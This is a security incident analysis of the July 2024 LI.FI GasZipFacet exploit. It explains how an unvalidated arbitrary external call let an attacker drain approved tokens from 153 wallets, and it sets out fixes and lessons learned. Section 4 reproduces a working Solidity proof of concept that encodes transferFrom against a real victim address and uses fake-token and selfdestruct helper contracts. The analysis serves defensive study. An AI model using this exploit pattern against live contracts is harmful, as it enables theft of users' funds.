# LI.FI — Diamond Facet Arbitrary Call Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2024-07-16 |
| **Protocol** | LI.FI (Cross-chain Bridge/Swap Aggregator) |
| **Chain** | Ethereum Mainnet + Arbitrum (Multi-chain) |
| **Loss** | ~$11,600,000 (USDT 6,335,900 + USDC 3,191,900 + DAI 169,500 etc.) |
| **Attacker EOA** | [0x8b3c...dcf3](https://etherscan.io/address/0x8b3cb6bf982798fba233bca56749e22eec42dcf3) |
| **Attack Contract** | [0x986a...c240](https://etherscan.io/address/0x986aca5f2ca6b120f4361c519d7a49c5ac50c240) |
| **Attack Tx (Primary)** | [0xd82f...3873](https://etherscan.io/tx/0xd82fe84e63b1aa52e1ce540582ee0895ba4a71ec5e7a632a3faa1aff3e763873) |
| **Vulnerable Contract (LiFiDiamond)** | [0x1231...4eae](https://etherscan.io/address/0x1231DEB6f5749EF6cE6943a275A1D3E7486F4EaE) |
| **Vulnerable Facet (GasZipFacet)** | [0xf28a...534](https://etherscan.io/address/0xf28A352377663cA134bd27B582b1a9A4dad7e534) |
| **Root Cause** | The newly deployed `GasZipFacet.depositToGasZipERC20()` allowed arbitrary external calls without whitelist validation, enabling token theft from users via `transferFrom()` |
| **Attack Type** | Arbitrary External Call |
| **Fork Block** | 20,318,962 |
| **PoC Source** | [DeFiHackLabs — Lifiprotocol_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-07/Lifiprotocol_exp.sol) |

---

## 1. Vulnerability Overview

LI.FI is a cross-chain bridge and DEX aggregator protocol in the Ethereum ecosystem that uses the **EIP-2535 Diamond Proxy** pattern. Once a user grants an infinite token approval to the LiFiDiamond contract, all subsequent bridge and swap transactions reuse that approval.

### Incident Background

**On 2024-07-11**, five days before the attack, the LI.FI team deployed a new `GasZipFacet` (v1.0.0) and added it to the LiFiDiamond. This facet included a `depositToGasZipERC20()` function that allowed users to exchange ERC20 tokens for native gas and simultaneously fund gas across multiple chains.

### Core Issue

While all other facets perform DEX whitelist validation through the **SwapperV2** helper before calling `LibSwap.swap()`, `GasZipFacet` omitted this validation due to **human error during the deployment process**. As a result:

- `_swapData.callTo` — the contract address to call was **arbitrarily configurable**
- `_swapData.callData` — the low-level call data was **arbitrarily configurable**

The attacker exploited this by encoding the `transferFrom()` selector (`0x23b872dd`) of the USDT contract as callData, and directly drained tokens from victim wallets that had previously granted infinite approvals to LiFiDiamond.

---

## 2. Vulnerable Code Analysis

### 2.1 Vulnerable `depositToGasZipERC20()` — Missing Validation ❌

```solidity
// ❌ GasZipFacet.sol (vulnerable version v1.0.0) — deployed: 2024-07-11
// Vulnerable address: 0xf28A352377663cA134bd27B582b1a9A4dad7e534

contract GasZipFacet is ILiFi, ReentrancyGuard {
    // ❌ Does not inherit SwapperV2 → no whitelist validation
    // (other facets inherit both 'SwapperV2, Validatable')

    function depositToGasZipERC20(
        LibSwap.SwapData calldata _swapData,  // ❌ fully user-controlled
        uint256 _destinationChains,
        address _recipient
    ) external {
        // ❌ No whitelist validation on callTo address
        // ❌ No function selector validation on callData
        // ❌ No validity check on sendingAssetId

        // Calls LibSwap.swap() directly → passes arbitrary callData to arbitrary contract
        LibSwap.swap(bytes32(0), _swapData);

        // Sends native token to Gas.zip router (this part is normal)
        gasZipRouter.deposit{value: address(this).balance}(
            _destinationChains,
            _recipient
        );
    }
}
```

### 2.2 `LibSwap.swap()` — Low-Level Call Execution ❌

```solidity
// LibSwap.sol
library LibSwap {
    struct SwapData {
        address callTo;        // ❌ target contract to call (arbitrarily configurable)
        address approveTo;     // approve target
        address sendingAssetId;
        address receivingAssetId;
        uint256 fromAmount;
        bytes callData;        // ❌ low-level call data (arbitrarily configurable)
        bool requiresDeposit;
    }

    function swap(bytes32 transactionId, SwapData calldata _swap) internal {
        // ✅ Checks whether target is a contract (minimal validation)
        if (!LibAsset.isContract(_swap.callTo)) revert InvalidContract();

        // If sendingAssetId is ERC20, approves approveTo
        if (!LibAsset.isNativeAsset(_swap.sendingAssetId)) {
            LibAsset.maxApproveERC20(
                IERC20(_swap.sendingAssetId),
                _swap.approveTo,
                _swap.fromAmount
            );
            // ⚠️ At the time of the approve() call, the attacker forcibly sends
            //    1 wei to LiFiDiamond via a Help contract
            //    (satisfying the balance condition)
        }

        // ❌ No whitelist/allowlist validation on callTo or callData
        // → If attacker sets callTo=USDT, callData=transferFrom(victim, attacker, amount),
        //   arbitrary token transfers become possible
        (bool success, bytes memory res) = _swap.callTo.call{value: 0}(_swap.callData);

        if (!success) LibUtil.revertWith(res);
    }
}
```

### 2.3 Correct Implementation — With Whitelist Validation ✅

```solidity
// ✅ SwapperV2.sol (helper properly inherited by other facets)
abstract contract SwapperV2 {
    // ✅ DEX whitelist validation
    function _executeSwaps(
        ILiFi.BridgeData memory _bridgeData,
        LibSwap.SwapData[] calldata _swapData,
        address payable _leftoverReceiver
    ) internal returns (uint256 finalAmountReceived) {
        for (uint256 i = 0; i < _swapData.length;) {
            // ✅ Verifies callTo is on the whitelist
            LibAllowList.validateContractData(
                _swapData[i].callTo,
                _swapData[i].callData
            );
            // ✅ Whitelist validation on approveTo as well
            if (_swapData[i].approveTo != address(0)) {
                LibAllowList.validateContractData(
                    _swapData[i].approveTo,
                    bytes("")
                );
            }
            LibSwap.swap(_bridgeData.transactionId, _swapData[i]);
            unchecked { ++i; }
        }
    }
}

// ✅ Fixed GasZipFacet (v2.0.0 and later)
contract GasZipFacet is ILiFi, ReentrancyGuard, SwapperV2, Validatable {
    // ✅ depositToGasZipERC20 function completely removed
    // ✅ ERC20 handling is only possible via swapAndStartBridgeTokensViaGasZip
    //    (whitelist validation automatically applied through SwapperV2 inheritance)

    function swapAndStartBridgeTokensViaGasZip(
        ILiFi.BridgeData memory _bridgeData,
        LibSwap.SwapData[] calldata _swapData,  // ✅ array, with validation
        IGasZip.GasZipData calldata _gasZipData
    )
        external
        payable
        nonReentrant
        refundExcessNative(payable(msg.sender))
        containsSourceSwaps(_bridgeData)        // ✅ validated via modifier
        doesNotContainDestinationCalls(_bridgeData)
    {
        // ✅ Last swap output must be native asset
        if (!LibAsset.isNativeAsset(_swapData[_swapData.length - 1].receivingAssetId))
            revert InvalidCallData();

        // ✅ SwapperV2 whitelist validation performed inside _depositAndSwap
        _bridgeData.minAmount = _depositAndSwap(
            _bridgeData.transactionId,
            _bridgeData.minAmount,
            _swapData,
            payable(msg.sender)
        );

        _startBridge(_bridgeData, _gasZipData);
    }
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

- The attacker pre-identified victim wallets (`0xABE4...2eF`) that had granted **infinite USDT approvals** to LiFiDiamond (`0x1231...4eae`)
- Deployed the attack contract (`0x986a...c240`) and prepared auxiliary `Money` and `Help` contracts
- Prepared a forced ETH transfer mechanism (using `selfdestruct` in the Help contract) to bypass LiFiDiamond's internal balance check

### 3.2 Execution Phase

```
Attacker EOA (0x8b3c...dcf3)
       │
       │ 1. call attack()
       ▼
┌──────────────────────────────────────────────────┐
│  ContractTest (Attack Contract)                   │
│  0x986aca5f2ca6b120f4361c519d7a49c5ac50c240      │
│                                                  │
│  2. Deploy new Money contract                    │
│                                                  │
│  3. Construct manipulated SwapData:              │
│     callTo      = USDT contract address          │
│     approveTo   = attacker address (this)        │
│     sendingAssetId = Money (fake ERC20)          │
│     callData    = transferFrom(victim, attacker, │
│                   2,276,295,880,553 USDT)        │
│                   [selector: 0x23b872dd]         │
└────────────────────────┬─────────────────────────┘
                         │ 4. call depositToGasZipERC20()
                         ▼
┌──────────────────────────────────────────────────┐
│  LiFiDiamond / GasZipFacet                       │
│  0x1231DEB6f5749EF6cE6943a275A1D3E7486F4EaE      │
│                                                  │
│  5. Enter LibSwap.swap()                         │
│     - isContract(callTo=USDT) → true ✓           │
│     - ❌ No whitelist validation                 │
│                                                  │
│  6. Call Money.approve() (approve to approveTo)  │
└──────────┬──────────────────────┬────────────────┘
           │                      │
           ▼                      │
┌─────────────────────────┐       │
│  Money (fake ERC20)      │       │
│                         │       │
│  Inside approve():      │       │
│  7. Deploy Help contract │       │
│  8. Help.sendto() force- │       │
│     sends 1 wei to       │       │
│     LiFiDiamond          │       │
│     (selfdestruct)       │       │
│  → bypasses balance check│       │
└─────────────────────────┘       │
           │                      │
           │ approve complete      │
           └──────────────────────┘
                         │
                         │ 9. Execute callTo.call(callData)
                         │    = USDT.call(transferFrom(victim→attacker))
                         ▼
┌──────────────────────────────────────────────────┐
│  USDT Contract                                   │
│  0xdAC17F958D2ee523a2206206994597C13D831ec7      │
│                                                  │
│  10. transferFrom(                               │
│        from  = victim wallet (0xABE4...2eF),     │
│        to    = attacker contract,                │
│        amount= 2,276,295,880,553                 │
│      )                                           │
│  → Leverages the infinite approval               │
│    previously granted to LiFiDiamond             │
│    to successfully drain victim tokens           │
└──────────────────────────────────────────────────┘
                         │
                         │ 11. Repeat same pattern (10+ Txs total)
                         ▼
                   Attacker profit: ~$11.6M
                   (USDT + USDC + DAI → converted to ETH → Tornado Cash)
```

### 3.3 Results

| Field | Value |
|------|------|
| Attack transactions | 10 on Ethereum + 1 on Arbitrum |
| Victim wallets | 153 |
| USDT drained | ~6,335,900 USDT |
| USDC drained | ~3,191,900 USDC |
| DAI drained | ~169,500 DAI |
| Other tokens | USDC.e, ETH, etc. |
| **Total loss** | **~$11,600,000** |
| Money laundering | Converted to ETH via Uniswap/Hop Protocol → Tornado Cash |

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// @KeyInfo -- Total Lost : ~10M USD
// TX : https://app.blocksec.com/explorer/tx/eth/0xd82fe84...3873
// Attacker : https://etherscan.io/address/0x8b3cb6bf...dcf3
// Attack Contract : https://etherscan.io/address/0x986aca5f...c240

library LibSwap {
    struct SwapData {
        address callTo;          // target contract to call
        address approveTo;       // approve target
        address sendingAssetId;  // sending token (uses fake Money contract)
        address receivingAssetId;
        uint256 fromAmount;
        bytes callData;          // ← key: arbitrary calldata injection point
        bool requiresDeposit;
    }
}

interface LiFiDiamond {
    function depositToGasZipERC20(
        LibSwap.SwapData calldata _swapData,
        uint256 _destinationChains,
        address _recipient
    ) external;
}

contract ContractTest is Test {
    IERC20 USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    LiFiDiamond Vulncontract = LiFiDiamond(0x1231DEB6f5749EF6cE6943a275A1D3E7486F4EaE);
    address Victim = 0xABE45eA636df7Ac90Fb7D8d8C74a081b169F92eF; // victim wallet

    function setUp() public {
        // [Step 0] Fork to block just before the attack — preserves victim balance and approval state
        vm.createSelectFork("mainnet", 20_318_962);
    }

    function testExploit() public {
        attack();
    }

    function attack() public {
        // [Step 1] Deploy fake ERC20 token (Money) — for hooking approve()
        money = new Money();

        // [Step 2] Construct malicious SwapData
        //   callTo   = USDT contract → final call target
        //   callData = encoded transferFrom(victim, attacker, amount)
        //              selector 0x23b872dd = transferFrom(address,address,uint256)
        LibSwap.SwapData memory swapData = LibSwap.SwapData({
            callTo: address(USDT),        // ← specify arbitrary external contract
            approveTo: address(this),
            sendingAssetId: address(money), // ← use fake token to hook approve
            receivingAssetId: address(money),
            fromAmount: 1,
            callData: abi.encodeWithSelector(
                bytes4(0x23b872dd),        // transferFrom selector
                address(Victim),           // from: victim wallet
                address(this),             // to:   attacker
                2_276_295_880_553          // amount: 2,276,295 USDT (6 decimals)
            ),
            requiresDeposit: true
        });

        // [Step 3] Call vulnerable function → executes USDT.transferFrom() without validation
        Vulncontract.depositToGasZipERC20(swapData, 0, address(this));
    }
}

// Fake ERC20: inside approve(), deploys a Help contract and
// forcibly sends 1 wei to LiFiDiamond via selfdestruct to satisfy balance condition
contract Money is Test {
    LiFiDiamond Vulncontract = LiFiDiamond(0x1231DEB6f5749EF6cE6943a275A1D3E7486F4EaE);
    Help help;

    function balanceOf(address) external pure returns (uint256) { return 1; }
    function allowance(address, address) external pure returns (uint256) { return 0; }

    // [Step 2-A] On approve() call, deploy Help contract then forcibly send 1 wei via selfdestruct
    function approve(address spender, uint256 amount) external returns (bool) {
        help = new Help();
        help.sendto{value: 1}(address(Vulncontract)); // ← force deposit 1 wei
        return true;
    }
}

// Forcibly transfers ETH via selfdestruct (works even on contracts without receive())
contract Help is Test {
    function sendto(address who) external payable {
        (bool success,) = address(who).call{value: msg.value}("");
        require(success, "Error");
        selfdestruct(payable(msg.sender)); // ← forced ETH transfer
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern | Similar Incidents |
|----|--------|--------|-----|-----------|-----------|
| V-01 | Unvalidated Arbitrary External Call | CRITICAL | CWE-20 | `03_access_control.md` | Socket Gateway (2024-01), Seneca (2024-02), Unizen (2024-03) |
| V-02 | Diamond Facet Deployment Process Flaw (Missing Whitelist Inheritance) | HIGH | CWE-284 | `08_initialization.md` | LI.FI prior hack (2022-03) |
| V-03 | Infinite Token Approval Model (Infinite Approval Risk) | MEDIUM | CWE-732 | `07_token_integration.md` | Radiant Capital (2024-01) |

### V-01: Unvalidated Arbitrary External Call

- **Description**: `depositToGasZipERC20()` allows `_swapData.callTo` (call target) and `_swapData.callData` (call data) to be fully controlled by the user. The internal `LibSwap.swap()` only checks whether the target is a contract, with no validation of which contract it is or which function is being called.
- **Impact**: Arbitrary theft of assets from any user who has granted token approvals to LiFiDiamond. Due to the nature of ERC20's `transferFrom()`, `msg.sender` (LiFiDiamond) can freely move victim balances within the previously granted allowance.
- **Attack Conditions**: (1) Victim has granted an infinite ERC20 approval to LiFiDiamond, (2) Attacker can access the `depositToGasZipERC20()` entry point

### V-02: Diamond Facet Deployment Process Flaw

- **Description**: LI.FI's other facets inherit `SwapperV2` to automatically enforce whitelist validation. `GasZipFacet` v1.0.0 was deployed without this inheritance, and neither the code review nor audit process prior to deployment detected the omission. The LI.FI team officially acknowledged this as "individual human error." A vulnerability with the same root cause was exploited once before in March 2022.
- **Impact**: A single unvalidated facet can render the entire Diamond contract's security ineffective
- **Attack Conditions**: New facet deployment + insufficient validation procedures

### V-03: Infinite Token Approval Model

- **Description**: LI.FI's API/SDK/Widget defaults to finite approvals, but some users manually configured infinite approvals. 153 wallets were affected; users with finite approvals suffered no losses.
- **Impact**: Wallets that granted infinite approvals to the vulnerable contract are exposed for their entire balance
- **Attack Conditions**: Victim has configured an infinite approval

---

## 6. Remediation Recommendations

### Immediate Actions

```solidity
// ✅ Immediate Action 1: Delete or block the depositToGasZipERC20 function
// (Actual LI.FI response: removed the facet from Diamond to block function entry)

// ✅ Immediate Action 2: Inherit SwapperV2 and add whitelist validation
contract GasZipFacet is ILiFi, ReentrancyGuard, SwapperV2, Validatable {
    // ✅ Inheriting SwapperV2 automatically applies whitelist validation to all swap calls

    // ✅ Use validated path instead of depositToGasZipERC20
    function swapAndStartBridgeTokensViaGasZip(
        ILiFi.BridgeData memory _bridgeData,
        LibSwap.SwapData[] calldata _swapData,
        IGasZip.GasZipData calldata _gasZipData
    )
        external
        payable
        nonReentrant
        refundExcessNative(payable(msg.sender))
        containsSourceSwaps(_bridgeData)           // ✅ validates source swap existence
        doesNotContainDestinationCalls(_bridgeData) // ✅ blocks destination calls
    {
        // ✅ Last swap output must be native (prevents direct ERC20 theft)
        if (!LibAsset.isNativeAsset(
            _swapData[_swapData.length - 1].receivingAssetId
        )) revert InvalidCallData();

        // ✅ LibAllowList.validateContractData() called inside _depositAndSwap
        _bridgeData.minAmount = _depositAndSwap(
            _bridgeData.transactionId,
            _bridgeData.minAmount,
            _swapData,
            payable(msg.sender)
        );

        _startBridge(_bridgeData, _gasZipData);
    }
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01 Arbitrary Call | Restrict `callTo` to DEX whitelist only; apply `LibAllowList` library to permit only approved function selectors for `callData` |
| V-02 Facet Flaw | Establish a new facet deployment checklist: introduce automated static analysis to verify SwapperV2/Validatable inheritance; mandate professional audit before deployment |
| V-03 Infinite Approval | Maintain disabled infinite approval in SDK/Widget; encourage users to approve only the necessary amount; provide periodic approval expiration notification features |

---

## 7. Lessons Learned

1. **Establish Diamond Facet Deployment Security Processes**: In the EIP-2535 Diamond pattern, each facet is deployed independently. A CI pipeline that automatically checks whether new facets correctly inherit existing security abstractions (e.g., SwapperV2, Validatable) is essential.

2. **Complete Validation of User Input**: External calls (`callTo`, `callData`) must be treated as untrusted input. In every function that performs low-level calls, the target address must be validated against a whitelist and callData must be validated against a list of permitted selectors.

3. **Repeated Identical Vulnerability Pattern**: LI.FI lost ~$600K in March 2022 from the same arbitrary call vulnerability. The recurrence of an identical vulnerability goes beyond simple human error and indicates a systemic absence of security processes. **Regression tests** based on past exploit cases must be executed regularly.

4. **Introduce Deployment Delay Periods for New Contracts**: In complex protocols, immediately exposing newly added modules to the public is risky. An internal timelock or minimum audit waiting period should be established to secure additional review time before market exposure.

5. **Educating Users on Infinite Approval Risks**: When a vulnerability exists at the protocol layer, infinite approvals exponentially amplify the damage. User-facing interfaces must not offer infinite approval as a default, and UX design that enforces appropriate approval amounts is necessary.

6. **Breadth of Arbitrary Call Vulnerability Type**: From Socket Gateway (2024-01), Seneca (2024-02), Unizen (2024-03), to LI.FI (2024-07), the same exploit type has recurred at intervals of months. Bridge and aggregator protocols must periodically conduct comprehensive reviews of the entire external call flow from the perspective of arbitrary `calldata` manipulation.

---

## 8. On-Chain Verification

### 8.1 Key Attack Transactions

| # | Tx Hash (Abbreviated) | Chain | Primary Drained Asset |
|---|----------------|------|----------------|
| 1 | [0xd82f...3873](https://etherscan.io/tx/0xd82fe84e63b1aa52e1ce540582ee0895ba4a71ec5e7a632a3faa1aff3e763873) | ETH | USDT 2,276,295 |
| 2 | [0x65a9...2755](https://etherscan.io/tx/0x65a92b189e4ae0b8a8a02cd59c5e9f6832586bd5167d41a24eb4f4d2ac692755) | ETH | USDT/USDC |

### 8.2 PoC vs On-Chain Amount Comparison

| Field | PoC Value | Actual On-Chain Value (1st Tx) | Match |
|------|--------|----------------------|------|
| USDT drained (1st) | 2,276,295.880553 USDT | 2,276,295.880553 USDT | ✅ |
| Victim wallet | `0xABE4...2eF` | `0xABE45eA636df7Ac90Fb7D8d8C74a081b169F92eF` | ✅ |
| callData selector | `0x23b872dd` (transferFrom) | `0x23b872dd` | ✅ |
| Total victim wallets | Single simulation | 153 | - |
| Total loss | ~$10M (PoC estimate) | ~$11.6M (actual) | Approximate |

### 8.3 Pre-Attack Prerequisites

- Victim (`0xABE4...2eF`) had set an infinite USDT approval to LiFiDiamond
- GasZipFacet (`0xf28a...534`) had been officially added to LiFiDiamond (deployed 2024-07-11)
- LiFiDiamond address was able to access victim balance as the `transferFrom()` caller on USDT

### 8.4 Fork Block Reference

- **Attack block**: 20,318,963 (2024-07-16 ~12:04 UTC)
- **PoC fork block**: 20,318,962 (block immediately before the attack)
- **GasZipFacet deployment block**: ~20,295,000 (2024-07-11)